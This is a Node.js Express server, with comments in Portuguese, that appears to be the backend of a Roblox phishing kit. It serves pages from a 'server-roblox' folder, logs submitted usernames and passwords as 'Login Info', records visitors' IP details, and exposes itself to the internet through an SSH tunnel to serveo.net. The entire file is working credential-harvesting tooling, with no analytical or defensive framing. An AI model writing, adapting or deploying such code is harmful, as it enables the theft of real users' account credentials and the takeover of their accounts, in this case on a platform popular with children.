const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const CFonts = require('cfonts');
const { exec } = require('child_process');
const app = express();
const port = 8080;

app.use(bodyParser.json());

app.use(express.static(path.join(__dirname, 'server-roblox')));

app.post('/server-roblox', (req, res) => {
    const { idusername, idpass } = req.body;
    console.log(`\nLogin Info: {\n  Username: ${idusername},\n  Password: ${idpass}\n}`);
    res.sendStatus(200);
});

app.post('/ipinfo', (req, res) => {
    const ipInfo = req.body;
    console.log(`\nIP Info:`, ipInfo);
    res.sendStatus(200);
});

CFonts.say('Roblox', {
    font: 'pallet',              
    align: 'left',             
    colors: ['yellowBright', 'white'], 
    background: 'black',        
    letterSpacing: 1,          
    lineHeight: 1,              
    space: true,                
    maxLength: '0',     
});

// Função para verificar se o servidor local está ativo
function checkLocalServer(url) {
    return new Promise((resolve, reject) => {
        const http = require('http');
        http.get(url, (resp) => {
            resolve(true);
        }).on('error', (err) => {
            reject(false);
        });
    });
}

// Função para executar o comando shell e capturar a saída
function runCommand(command) {
    return new Promise((resolve, reject) => {
        exec(command, (error, stdout, stderr) => {
            if (error) {
                reject(error);
                return;
            }
            resolve(stdout.trim());
        });
    });
}

async function setupSSH() {
    try {
        // Verificar se o servidor local está ativo
        const isLocalServerActive = await checkLocalServer(`http://localhost:${port}`);

        if (isLocalServerActive) {
            // Comando SSH para redirecionamento de porta usando serveo.net
            const serveoCommand = 'ssh -R 80:localhost:8080 serveo.net';

            console.log(`Executando o comando SSH: ${serveoCommand}`);

            // Executar o comando SSH e capturar a saída
            const result = await runCommand(serveoCommand);

            // Extrair o URL gerado pelo SSH (serveo.net)
            const match = result.match(/Forwarding\s*(https?:\/\/.*)\s*->\s*localhost:8080/);

            if (match && match[1]) {
                const forwardingUrl = match[1];
                console.log('Link gerado pelo SSH:', forwardingUrl);
            } else {
                throw new Error('Não foi possível encontrar o URL gerado pelo SSH.');
            }
        } else {
            throw new Error('O servidor local não está ativo.');
        }
    } catch (error) {
        console.error('Erro ao configurar o redirecionamento de porta SSH:', error);
    }
}

// Chamar a função setupSSH para iniciar o redirecionamento de porta SSH
setupSSH();

// Iniciar o servidor Express somente depois de configurar o redirecionamento de porta SSH
app.listen(port, () => {
    console.log('[-] Server connected!')
    console.log(`[-] Server is running on http://localhost:${port}`);
});
